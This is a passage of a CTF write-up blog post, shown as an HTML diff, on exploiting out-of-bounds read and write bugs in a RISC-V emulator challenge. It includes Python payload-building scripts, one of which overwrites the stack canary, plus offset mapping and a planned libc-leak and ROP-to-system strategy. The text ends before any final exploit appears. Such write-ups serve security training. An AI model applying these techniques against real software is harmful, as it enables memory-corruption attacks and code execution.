@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTM CTF Quals: (CS2100 - OOBW/R) | BinaryChunk’s Blog</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="HackTM CTF Quals: (CS2100 - OOBW/R)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This was an interesting CTF that took place between 18th and 19th Feb, 2023. I actually solved the challenge way after the CTF was over, therefore (tl;dr) the following are the steps that I would have taken during the CTF to solve the challenge." />
+<meta property="og:description" content="This was an interesting CTF that took place between 18th and 19th Feb, 2023. I actually solved the challenge way after the CTF was over, therefore (tl;dr) the following are the steps that I would have taken during the CTF to solve the challenge." />
+<link rel="canonical" href="http://0.0.0.0:4000/ctfs/2023-03-05-HackTM-CS2100/" />
+<meta property="og:url" content="http://0.0.0.0:4000/ctfs/2023-03-05-HackTM-CS2100/" />
+<meta property="og:site_name" content="BinaryChunk’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-09-21T18:25:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTM CTF Quals: (CS2100 - OOBW/R)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-21T18:25:00+00:00","datePublished":"2025-09-21T18:25:00+00:00","description":"This was an interesting CTF that took place between 18th and 19th Feb, 2023. I actually solved the challenge way after the CTF was over, therefore (tl;dr) the following are the steps that I would have taken during the CTF to solve the challenge.","headline":"HackTM CTF Quals: (CS2100 - OOBW/R)","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/ctfs/2023-03-05-HackTM-CS2100/"},"url":"http://0.0.0.0:4000/ctfs/2023-03-05-HackTM-CS2100/"}</script>
+<!-- End Jekyll SEO tag -->
+<link id="main-stylesheet" rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="BinaryChunk&apos;s Blog" />
+
+<link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
+<style>
+@font-face {
+  font-family: 'Open Sans';
+  src: url('//fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4kaVIGxA.woff2')
+       format('woff2');
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  font-stretch: 100%;
+}
+
+body {
+  font-family: 'Open Sans', sans-serif;
+  font-size: 11pt;
+}
+</style>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">BinaryChunk&#39;s Blog</a>
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon"></span>
+        </label>
+
+        <div class="nav-items">
+  <a class="nav-item" href="/ctfs/">CTFs</a>
+</div>
+
+      </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTM CTF Quals: (CS2100 - OOBW/R)</h1>
+    <div class="post-meta">
+      <time class="dt-published" datetime="2025-09-21T18:25:00+00:00" itemprop="datePublished">
+        Sep 21, 2025
+      </time>
+    </div>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This was an interesting CTF that took place between 18th and 19th Feb, 2023. I actually solved the challenge way after the CTF was over, therefore (tl;dr) the following are the steps that I would have taken during the CTF to solve the challenge.</p>
+
+<p>The following was the description of the provided challenge:</p>
+
+<blockquote>
+  <p>To all my CS2100 Computer Organisation students, I hope you’ve enjoyed the lectures thus far on RISC-V assembly.
+I have set-up an online service for you to test your own RISC-V code!
+Simply connect to the service through tcp:</p>
+
+  <p><code class="language-plaintext highlighter-rouge">nc 34.141.16.87 10000</code></p>
+
+  <p><strong>Credit</strong>: Thanks to <code class="language-plaintext highlighter-rouge">@fmash16</code> for his emulator! I didn’t even have to compile the emulator binary myself :O https://github.com/fmash16/riscv_emulator/blob/main/main</p>
+</blockquote>
+
+<h3 id="initial-analysis">Initial Analysis</h3>
+
+<p>The challenge provided a <em>zip</em> file for download that had the challenge files. These files can be downloaded from here <a href="https://drive.google.com/file/d/1fvZ0rfXOPmH_HqpG0tDVaPl45_bKmpGC/view?usp=sharing">attachment.zip</a></p>
+
+<p>The challenge binary file provided was called <code class="language-plaintext highlighter-rouge">main</code> and checking the protections enabled using the <code class="language-plaintext highlighter-rouge">checksec</code> command, all exploit mitgations protections are enabled.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec ./main
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/Desktop/CTFs/23/HackTM/Pwn/CS2100/chal/main'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div></div>
+
+<p>From the description and from the provided <a href="https://github.com/fmash16/riscv_emulator">repo</a> this challenge seems to be a <strong>VM</strong> that is used to emulate <em>RISC-V</em> instructions. It also turns out that the provided challenge binary file is a compiled version of the repo.</p>
+
+<p>For a quick description, <strong>RISC-V</strong> is an ISA that uses a <em>load</em> and <em>store</em> architecture and the base instructions set has a fixed length of 32-bit aligned instructions, the different registers and architecture design can be found <a href="https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8">here</a>.</p>
+
+<p>Since this was a <strong>VM</strong> based challenge, I decide to look for <em>Out-of-Bounds</em> (OOB) vulnerabilities, this was just a hunch coming from earlier writeups that I read based on challenges that had the same bug.</p>
+
+<h3 id="source-code-review">Source Code Review</h3>
+
+<p>From the github repo provided, we can access the source code, this really reduced the hustle of decompling/reversing the binary. As briefly mentioned above, <em>RISC_V</em> applies the load and store architecture. So the key to finding the vulnerablity is to look at instructions that implement these <em>loads</em> and <em>stores</em>.</p>
+
+<p>You can clone the repo to easily review the source-code from you’re favourite editor. Most of the interesting code is at the <code class="language-plaintext highlighter-rouge">src/cpu.c</code>. Skimming through the code, a <code class="language-plaintext highlighter-rouge">CPU</code> object with <em>registers</em> and a <em>program counter</em> is initialized.</p>
+
+<p>From here, there are interesting functions like <em>exec_LN</em> where (N) is used to specifty the size that could either be a Byte, Half Word, Word or a Double. These functions perform some sort of <em>store</em> since they call the <em>cpu_load</em> function.</p>
+
+<p>For example the <em>exec_LD</em> function is as follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// This function queries some registers and calls cpu_load</span>
+<span class="kt">void</span> <span class="nf">exec_LB</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// load 1 byte to rd from address in rs1</span>
+    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="n">imm_I</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
+    <span class="kt">uint64_t</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
+    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rd</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)(</span><span class="kt">int8_t</span><span class="p">)</span> <span class="n">cpu_load</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+    <span class="n">print_op</span><span class="p">(</span><span class="s">"lb</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// CPU load further calls bus_load</span>
+<span class="kt">uint64_t</span> <span class="nf">cpu_load</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">bus_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">cpu</span><span class="o">-&gt;</span><span class="n">bus</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//bus load calls dram_load</span>
+<span class="kt">uint64_t</span> <span class="nf">bus_load</span><span class="p">(</span><span class="n">BUS</span><span class="o">*</span> <span class="n">bus</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">dram_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">bus</span><span class="o">-&gt;</span><span class="n">dram</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">//dram load (vulnerable code) </span>
+<span class="kt">uint64_t</span> <span class="nf">dram_load_8</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
+    <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span> <span class="o">-</span> <span class="n">DRAM_BASE</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>From the <em>dram_load_n</em> source code snippet above, there is clearly an <strong>OOB</strong> Read vulnerability. This is because an attacker can read beyond the array buffer since there are no bounds checks to check if addr exceeds its limits; moreover the attacker has control over this value. This array is intialized with the <em>DRAM_SIZE</em> value as shown from the following source code snippet.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define DRAM_SIZE 1024*1024*1
+#define DRAM_BASE 0x80000000
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">DRAM</span> <span class="p">{</span>
+	<span class="kt">uint8_t</span> <span class="n">mem</span><span class="p">[</span><span class="n">DRAM_SIZE</span><span class="p">];</span>     <span class="c1">// Dram memory of DRAM_SIZE</span>
+<span class="p">}</span> <span class="n">DRAM</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>The maximum size of the array is <code class="language-plaintext highlighter-rouge">0x100000</code>, therefore if we pass a value for example <code class="language-plaintext highlighter-rouge">0x80100010</code> as the <em>addr</em>, the size passed to the array will be <code class="language-plaintext highlighter-rouge">0x100010</code> and therefore we will be reading <code class="language-plaintext highlighter-rouge">0x10</code> bytes outside leading to a <em><strong>OOBR</strong></em> bug.</p>
+
+<p>The same applies to the <em>store</em> set of instruction(s) that do not perform any <strong>bounds</strong> check therefore introducing an <em><strong>OOBW</strong></em> bug.</p>
+
+<h3 id="exploitation-strategy">Exploitation Strategy</h3>
+
+<p>Before weaponizing our exploit, we need to understand how the VM works. From its source code <code class="language-plaintext highlighter-rouge">main.c</code>, the application requires a file passed as its command line argument in this case a <em>bin</em> file. The size of the file is then determined and the contents of the file are copied to memory. Using a loop, based on specified instructions read from the file, the <code class="language-plaintext highlighter-rouge">cpu_execute</code> will implement these as <strong>RISC-V</strong> instructions.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: rvemu &lt;filename&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Initialize cpu, registers and program counter</span>
+    <span class="k">struct</span> <span class="n">CPU</span> <span class="n">cpu</span><span class="p">;</span>
+    <span class="n">cpu_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+    <span class="c1">// Read input file</span>
+    <span class="n">read_file</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+
+    <span class="c1">// cpu loop</span>
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// fetch</span>
+        <span class="kt">uint32_t</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">cpu_fetch</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+        <span class="c1">// Increment the program counter</span>
+        <span class="n">cpu</span><span class="p">.</span><span class="n">pc</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+        <span class="c1">// execute</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cpu_execute</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">))</span>
+            <span class="k">break</span><span class="p">;</span>
+
+        <span class="n">dump_registers</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">cpu</span><span class="p">.</span><span class="n">pc</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+            <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">cpu_execute</code> implementation from the <code class="language-plaintext highlighter-rouge">src/cpu.c</code> is a follows:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">cpu_execute</span><span class="p">(</span><span class="n">CPU</span> <span class="o">*</span><span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">int</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">inst</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>           <span class="c1">// opcode in bits 6..0</span>
+    <span class="kt">int</span> <span class="n">funct3</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">;</span>    <span class="c1">// funct3 in bits 14..12</span>
+    <span class="kt">int</span> <span class="n">funct7</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">25</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>   <span class="c1">// funct7 in bits 31..25</span>
+
+    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                   <span class="c1">// x0 hardwired to 0 at each cycle</span>
+
+    <span class="cm">/*printf("%s\n%#.8lx -&gt; Inst: %#.8x &lt;OpCode: %#.2x, funct3:%#x, funct7:%#x&gt; %s",*/</span>
+            <span class="cm">/*ANSI_YELLOW, cpu-&gt;pc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">%#.8lx -&gt; %s"</span><span class="p">,</span> <span class="n">ANSI_YELLOW</span><span class="p">,</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">pc</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="n">ANSI_RESET</span><span class="p">);</span> <span class="c1">// DEBUG</span>
+
+    <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">case</span> <span class="n">LUI</span><span class="p">:</span>   <span class="n">exec_LUI</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+        <span class="k">case</span> <span class="n">AUIPC</span><span class="p">:</span> <span class="n">exec_AUIPC</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+</code></pre></div></div>
+<p>What this does is that is basically does some logical operations on the instructions written to the file to determine the <code class="language-plaintext highlighter-rouge">opcode</code>, <code class="language-plaintext highlighter-rouge">func3</code>, <code class="language-plaintext highlighter-rouge">funct7</code>, <code class="language-plaintext highlighter-rouge">rd</code>, <code class="language-plaintext highlighter-rouge">rs1</code>, <code class="language-plaintext highlighter-rouge">rs2</code> and the <code class="language-plaintext highlighter-rouge">imm</code> values. Based on the opcode, certain instructions are emulated.</p>
+
+<p>Using a simple python script, we will write these instructions into a <code class="language-plaintext highlighter-rouge">bin</code> file, to basically implement an <strong>exec_ADDI</strong> instruction for POC. This should basically <em>ADD</em> two values and store the result to a register.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">exec_ADDI</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="n">imm_I</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
+    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rd</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
+    <span class="n">print_op</span><span class="p">(</span><span class="s">"addi</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>From the <code class="language-plaintext highlighter-rouge">src/cpu.c</code>, this instruction is only implemented when the opcode is <strong>I_TYPE (0x13)</strong> and the value of <strong>funct3</strong> is <code class="language-plaintext highlighter-rouge">0x0</code> from <code class="language-plaintext highlighter-rouge">include/opcodes.h</code>. Using a simple python script as shown below, we will try to re-produce values that will implement this instruction.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#opcodes
+</span><span class="n">I_TYPE</span> <span class="o">=</span> <span class="mh">0x13</span>
+<span class="n">ADD</span> <span class="o">=</span> <span class="mh">0x0</span>
+
+<span class="c1"># Registers 
+</span><span class="n">A0</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">SP</span> <span class="o">=</span> <span class="mh">0x2</span>
+
+
+<span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+	<span class="n">inst</span> <span class="o">=</span> <span class="mi">0</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">funct3</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">funct7</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">25</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rs1</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rs2</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span>
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rd</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
+	
+	<span class="k">return</span> <span class="n">inst</span>
+
+
+<span class="k">def</span> <span class="nf">exec_ADDI</span><span class="p">(</span><span class="n">opcode</span><span class="o">=</span><span class="n">I_TYPE</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="n">ADD</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+	<span class="n">inst</span> <span class="o">=</span> <span class="n">init</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">funct3</span><span class="p">,</span> <span class="n">funct7</span><span class="p">,</span> <span class="n">rd</span><span class="p">,</span> <span class="n">rs1</span><span class="p">,</span> <span class="n">rs2</span><span class="p">)</span>	
+	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">imm</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span>
+	<span class="k">return</span> <span class="n">inst</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+		<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
+	<span class="p">])</span>
+	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"file.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span> <span class="n">fp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+	<span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>The above python script will write the instructions used to emulate an <em>exec_ADDI</em> RISC-V instruction into<code class="language-plaintext highlighter-rouge">file.bin</code>. When these instructions are executed, this will add the value in the SP register passed to <code class="language-plaintext highlighter-rouge">rs1</code> which was <code class="language-plaintext highlighter-rouge">0x80100000</code> with <code class="language-plaintext highlighter-rouge">2</code> and the result which is expected to be <code class="language-plaintext highlighter-rouge">0x80100002</code> will be stored in the <code class="language-plaintext highlighter-rouge">A0</code> register.</p>
+
+<p><img src="https://i.imgur.com/yjWpLRl.png" alt="" /></p>
+
+<p>Currently, we have not idea what is beyond the bounds of the array and where it is located. This can be a location on the <em>stack</em> that can allow us to control EIP or an mmaped location in libc that can allow us to overwrite a libc pointer e.g <em>__malloc_hook</em>. Using the <em>OOBW</em> vulnerability, we will write a value slight beyond the array and use the debugger to find this value in memory.</p>
+
+<p>Using the <em>exec_ADDI</em> instruction and an <em>exec_SLLI</em> to shift this value, we will store the value <em>0x42424242</em> into one of RISC-V’s registers that will be followed by a store that will write this value beyond the array at <em>mem[sp+0x4]</em>. This can be done from the following python source code snippet.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span><span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x424</span><span class="p">),</span>
+        <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">12</span><span class="p">),</span>
+        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x242</span><span class="p">),</span>
+        <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">),</span>
+        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x42</span><span class="p">),</span>
+        <span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x4</span><span class="p">),</span> <span class="c1">#trigger OOBW
+</span>        <span class="p">])</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"file.bin"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span> <span class="n">fp</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Notice that since the <code class="language-plaintext highlighter-rouge">SP</code> register already has the value <code class="language-plaintext highlighter-rouge">0x80100000</code>, passing <code class="language-plaintext highlighter-rouge">0x4</code> into <strong>imm</strong> will write the value from the <code class="language-plaintext highlighter-rouge">A0</code> register leading to a Out-Of-Bounds by 0x4 bytes. 
+When I ran the executable and passed the <code class="language-plaintext highlighter-rouge">file.bin</code> file that was generated from the above python script, I received a <em>Stack Smashing Detected</em> error.</p>
+
+<p><img src="https://i.imgur.com/FRVigQl.png" alt="" /></p>
+
+<p>This was therefore an indicator that the <em>*mem*</em> array was indeed on the stack and since this was initialized in the <em>main()</em> function, it particulary might be overwriting the stack canary on <em>main’s</em> stack. This can therefore be better visualized from the debugger. Load the emulaator into the debugger and set a break-point in the <em>main</em> function right before the <em>__stack_canary</em> check at <code class="language-plaintext highlighter-rouge">br *main + 218</code>.</p>
+
+<p>When the break-point it hit and the stack where the canary is placed at <code class="language-plaintext highlighter-rouge">rbp - 0x8</code> is examined, indeed the canary is overwritten with the lower 4 bytes from the arbitrary value we wrote earlier.</p>
+
+<p><img src="https://i.imgur.com/SPJb5mR.png" alt="" /></p>
+
+<p>The stack canary on the stack, is usually followed by <code class="language-plaintext highlighter-rouge">RBP</code> and finally the saved return, therefore by adjusting the value mem[sp+0x4], we can come to the following conclusion.</p>
+
+<ul>
+  <li><strong>Stack Canary</strong> (mem[sp+0x8])</li>
+  <li><strong>RBP</strong> (mem[sp+0x10])</li>
+  <li><strong>Saved Return Address</strong> (mem[sp+0x18])</li>
+</ul>
+
+<h3 id="weaponization">Weaponization</h3>
+
+<p>We already know the location of the array in memory and its offset from the  <em>saved return address</em>. An <strong>OOBR</strong> will be used to leak a libc address from the stack and since we are in main’s stack, its return address will most probaly be <code class="language-plaintext highlighter-rouge">__libc_start_main_ret</code>; with this address we can find the base address to libc and craft a ROP chain, to call system that will return a shell for code execution bypassing <em>ASLR</em>.</p>
+
+<blockquote>
+  <p><strong>NOTE</strong>: <em>Since RISC-V uses a load and store architecture, these address will therefore need to be written to specific ‘registers’ before being written into memory</em>.</p>
+</blockquote>
+
